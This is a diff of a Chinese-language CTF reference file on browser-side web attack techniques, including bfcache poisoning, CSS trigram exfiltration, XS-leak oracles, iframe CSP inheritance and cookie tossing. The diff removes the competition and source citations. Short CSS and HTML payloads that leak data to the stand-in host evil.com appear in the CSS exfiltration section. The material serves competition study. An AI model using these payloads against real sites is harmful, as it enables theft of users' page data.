@@ -21,7 +21,7 @@
 ## §2 bfcache 污染攻击
 
 > bfcache（Back-Forward Cache）冻结页面离开时的**完整状态**（含 fetch 发出的响应）。
-> 2023-2026 顶级赛事高频原语（HITCON/corCTF/idekCTF 2024）。
+> 2023-2026 顶级赛事高频原语。
 
 **场景**: 目标页 navigate 时返回脱敏内容，但内部 `fetch(同URL)` 拿原始内容
 
@@ -37,12 +37,12 @@
 **关键限制**：
 - Chrome 默认开 bfcache；2025/09 起连 `Cache-Control:no-store` 也开 bfcache
 - 用 `new WebSocket()` 主动禁掉 bfcache（连接存在时页面不进 bfcache）
-- 也可利用 bfcache 让 fetch 携带攻击者 header（corCTF 2024 iframe-note 用它带 SCRIPT_NAME）
+- 也可利用 bfcache 让 fetch 携带攻击者 header（如带 SCRIPT_NAME header 绕过校验）
 
 ## §3 CSS trigram exfil（通用数据外带框架）
 
 > CSP 封死 JS 时，用 CSS 属性选择器 + 资源加载做数据外带。
-> 2023-2026 连续多年出现（0CTF/GoogleCTF/DiceCTF/corCTF）。
+> 2023-2026 连续多年出现。
 
 ### 基本原理
 ```css
@@ -60,7 +60,7 @@
 ```
 **服务端还原**：收集泄漏的 trigram → 按"后缀==前缀"做欧拉路径/回溯合并还原原串。
 
-### sanitizer 绕过（GoogleCTF 2024 IN-THE-SHADOWS）
+### sanitizer 绕过
 ```css
 /* @font-feature-values 的 cssText 序列化会去掉单引号 */
 @font-feature-values 'lol; @\0069mport "//evil.com/x";p' {}
@@ -73,7 +73,11 @@
 <img class="i00" loading="lazy" src="//evil.com/leak?q=i00" style="display:none">
 ```
 
-**源文档**: `docs/资料/writeup-sources/web/2024-googlectf-huli.md`（含完整 leak server 代码）、`2023-0ctf-huli.md`（trigram 首发）
+**无 @import/url 时的触发器**
+```html
+<!-- lazy-loading img：display:none 时不加载，CSS 命中改 display:block 才发请求 -->
+<img class="i00" loading="lazy" src="//evil.com/leak?q=i00" style="display:none">
+```
 
 ## §4 xsleak oracle 列表
 
@@ -88,11 +92,11 @@
 | error 计数 | secret 影响错误数量 | `window.onerror` 计数 |
 | 重定向次数 | secret 影响重定向链 | `performance.navigation.redirectCount` |
 
-**扩展 timing 侧信道**（corCTF 2024/2025）：Chrome 扩展的 content-script 写得低效（逐 phrase replaceAll），可用条件性触发让文档体积指数膨胀（O(2^n)），测卡顿二分猜 flag。
+**扩展 timing 侧信道**：Chrome 扩展的 content-script 写得低效（逐 phrase replaceAll），可用条件性触发让文档体积指数膨胀（O(2^n)），测卡顿二分猜 flag。
 
 ## §5 iframe reparenting / sandbox / CSP 继承
 
-> 点"后退"时，iframe 的 **sandbox 跟随当前最新页面**，但 **src/srcdoc 的 CSP 继承 session history 里的旧状态**。（idekCTF 2024 srcdoc-memos）
+> 点"后退"时，iframe 的 **sandbox 跟随当前最新页面**，但 **src/srcdoc 的 CSP 继承 session history 里的旧状态**。
 
 ```
 攻击步骤:
@@ -110,10 +114,10 @@
 ## §6 其他客户端原语速查
 
 ### connection pool + 递归 @import（无需自有服务器）
-Chrome 每域约 6（H1）/255（H2）连接上限。占满连接池 → 暂停/恢复目标页 CSS 请求 → 递归 `@import` 逐字符 leak（DiceCTF 2024 burnbin）。
+Chrome 每域约 6（H1）/255（H2）连接上限。占满连接池 → 暂停/恢复目标页 CSS 请求 → 递归 `@import` 逐字符 leak。
 
 ### cookie tossing
-在目标域的可控子域写 cookie → 父域读取。`public suffix`（如 `*.usercontent.goog`）内无法直接 toss → 构造 HTTP 子域 `http://sbx-fake.sbx-real.host/`（GoogleCTF 2024 GAME ARCADE）。
+在目标域的可控子域写 cookie → 父域读取。`public suffix`（如 `*.usercontent.goog`）内无法直接 toss → 构造 HTTP 子域 `http://sbx-fake.sbx-real.host/`。
 
 ### 解析器差异 checklist
 | 差异 | 利用 |
@@ -126,7 +130,6 @@ Chrome 每域约 6（H1）/255（H2）连接上限。占满连接池 → 暂停/
 
 ### XSS 无括号无分号
 严格 sanitizer 过滤 `()` `;` 时，可用模板字符串/标签事件/onerror=throw/import()/异常重写构造执行。
-**源文档**: `docs/资料/writeup-sources/web/2025-xss-no-paren-huli.md`
 
 ## §7 工具链
 
@@ -143,4 +146,3 @@ Chrome 每域约 6（H1）/255（H2）连接上限。占满连接池 → 暂停/
 - `$AGENT_DIR/knowledge-base/race-conditions.md` — 单包攻击 + 原型链污染 + 解析器差异详解
 - `$AGENT_DIR/knowledge-base/csp-bypass.md` — CSP 绕过专题
 - `$AGENT_DIR/knowledge-base/browser-debugging.md` — 浏览器调试方法
-- 源文档库: `docs/资料/writeup-sources/web/` — 11 篇一手 writeup（含完整 exploit 代码）
